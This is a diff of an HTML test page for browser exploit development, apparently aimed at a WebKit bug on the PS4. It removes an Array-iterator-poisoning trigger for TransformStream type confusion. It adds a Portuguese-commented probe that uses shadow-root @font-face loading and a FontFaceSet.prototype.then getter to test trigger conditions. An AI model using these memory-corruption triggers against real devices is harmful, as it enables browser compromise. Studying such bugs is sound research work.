@@ -1,65 +1,120 @@
+
 <!DOCTYPE html>
 <html>
+<head><meta charset="utf-8"></head>
 <body>
+<pre id="log"></pre>
 <script>
+// Diagnostico dos pre-requisitos para o bug 86074ba no PS4
+//
+// Questoes a responder:
+//   P1: document.fonts.ready existe e e uma Promise?
+//   P2: document.fonts.load() funciona e retorna Promise?
+//   P3: document.fonts.status transiciona para "loading"?
+//   P4: FontFaceSet.prototype.then e acessivel?
+//   P5: Shadow DOM + @font-face funciona no PS4?
+//   P6: document.styleSheets.length acessa shadow roots?
+//   P7: O trigger completo funciona com data: URL grande (pending)?
 
-// createInternalTransformStreamFromTransformer returns a 3-element array
-// that the C++ side iterates with convert<IDLSequence<IDLObject>>. By
-// poisoning Array.prototype[Symbol.iterator] we can substitute arbitrary
-// JS objects for the readable/writable entries. Without a runtime check,
-// the C++ side then treats those objects as JSReadableStream/JSWritableStream
-// and dereferences attacker-controlled memory.
+function log(s) { document.getElementById('log').textContent += s + '\n'; }
 
-const originalIterator = Array.prototype[Symbol.iterator];
+// P1 — document.fonts.ready
+log('P1 fonts.ready: ' + (typeof document.fonts.ready));
+log('    e Promise: ' + (document.fonts.ready instanceof Promise));
 
-// Variant 1: substitute plain objects for the readable/writable slots.
-Array.prototype[Symbol.iterator] = function() {
-    const arr = this;
-    let i = 0;
-    return {
-        next() {
-            
-            if (i >= arr.length)
-                return { done: true };
-            let val = arr[i];
-            if (arr.length === 3 && i >= 1)
-                val = { fake: true };
-            i++;
-            return { value: val, done: false };
+// P2 — document.fonts.load
+log('P2 fonts.load: ' + (typeof document.fonts.load));
+
+// P3 — status inicial
+log('P3 status inicial: ' + document.fonts.status);
+document.fonts;  // "touch" como no test original
+log('    apos touch:  ' + document.fonts.status);
+
+// P4 — FontFaceSet.prototype.then
+var protoThenExists = 'then' in FontFaceSet.prototype;
+log('P4 FontFaceSet.prototype.then in: ' + protoThenExists);
+
+// P5 — Shadow DOM + @font-face
+var host = document.createElement('div');
+document.body.appendChild(host);
+try {
+    var shadow = host.attachShadow({ mode: 'open' });
+    var style = document.createElement('style');
+    // data: URL grande — fica pending (confirmado no PS4)
+    var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(100000) + '")';
+    style.textContent = '@font-face { font-family: testFont86; src: ' + pendingUrl + '; } .p { font: 24px testFont86; }';
+    shadow.appendChild(style);
+    var span = document.createElement('span');
+    span.className = 'p';
+    span.textContent = 'A';
+    shadow.appendChild(span);
+    log('P5 Shadow DOM + @font-face: OK (sem excecao)');
+} catch(e) {
+    log('P5 ERRO: ' + e.message);
+}
+
+// P3b — status apos @font-face no shadow root + layout
+void document.body.offsetHeight;
+log('P3b status apos layout: ' + document.fonts.status);
+
+// P6 — Verificar se document.fonts.load() transiciona para loading
+var loadStartTime = Date.now();
+try {
+    var loadPromise = document.fonts.load('24px testFont86', 'A');
+    log('P6 fonts.load() retornou: ' + (typeof loadPromise));
+    log('    status apos load(): ' + document.fonts.status);
+} catch(e) {
+    log('P6 ERRO em fonts.load(): ' + e.message);
+}
+
+// P7 — Instalar getter em FontFaceSet.prototype.then e ver se dispara
+var getterCount = 0;
+try {
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            delete FontFaceSet.prototype.then;
+            getterCount++;
+            log('P7 FontFaceSet.prototype.then getter disparou! count=' + getterCount);
+            // Nao chamar host.remove() ainda — apenas detectar disparo
+            return undefined;
         }
-    };
-};
-check("plain-object substitution", () => new TransformStream());
+    });
+    log('P7 FontFaceSet.prototype.then getter instalado');
+} catch(e) {
+    log('P7 ERRO ao instalar getter: ' + e.message);
+}
 
-// Variant 2: substitute an object that holds a heap pointer (would survive
-// the initial dereference and trigger the write-increment / vtable hijack).
-let buf = new ArrayBuffer(65536);
-Array.prototype[Symbol.iterator] = function() {
-    const arr = this;
-    let i = 0;
-    return {
-        next() {
-            if (i >= arr.length)
-                return { done: true };
-            let val = arr[i];
-            if (arr.length === 3 && i >= 1)
-                val = { pad: 0, ptr: buf };
-            i++;
-            return { value: val, done: false };
-        }
-    };
-};
-check("object-reference substitution", () => new TransformStream());
+// P8 — Trigger: adicionar style e acessar document.styleSheets.length
+try {
+    var prependedStyle = document.createElement('style');
+    prependedStyle.textContent = '.unused { color: red; }';
+    if (host.shadowRoot)
+        host.shadowRoot.prepend(prependedStyle);
+    log('P8 style prependado ao shadow root');
+} catch(e) {
+    log('P8 ERRO prepend: ' + e.message);
+}
 
-// Variant 3: truncated iterator returning fewer than 3 entries.
-Array.prototype[Symbol.iterator] = function() {
-    return { next() { return { done: true }; } };
-};
-check("truncated iterator", () => new TransformStream());
+// Trigger principal
+var ssLen = document.styleSheets.length;
+log('P8 document.styleSheets.length: ' + ssLen);
+log('P8 getter disparou apos styleSheets.length: ' + (getterCount > 0));
 
-Array.prototype[Symbol.iterator] = originalIterator;
-
-
+// Aguardar microtasks para ver se getter dispara async
+Promise.resolve().then(function() {
+    log('P8 getter disparou async (microtask): ' + (getterCount > 0));
+    log('\n=== RESUMO ===');
+    log('fonts.ready presente:  ' + (document.fonts.ready instanceof Promise));
+    log('fonts.load presente:   ' + (typeof document.fonts.load === 'function'));
+    log('status atingiu loading:' + (document.fonts.status === 'loading' || document.fonts.status === 'loading'));
+    log('getter proto funciona: ' + (typeof FontFaceSet.prototype !== 'undefined'));
+    log('getter disparou:       ' + (getterCount > 0));
+    if (getterCount === 0 && document.fonts.status === 'loaded') {
+        log('\nSTATUS LOADED = fonte nao ficou em loading.');
+        log('Usar URL maior (1.1MB) ou endpoint que nao responde.');
+    }
+});
 </script>
 </body>
 </html>
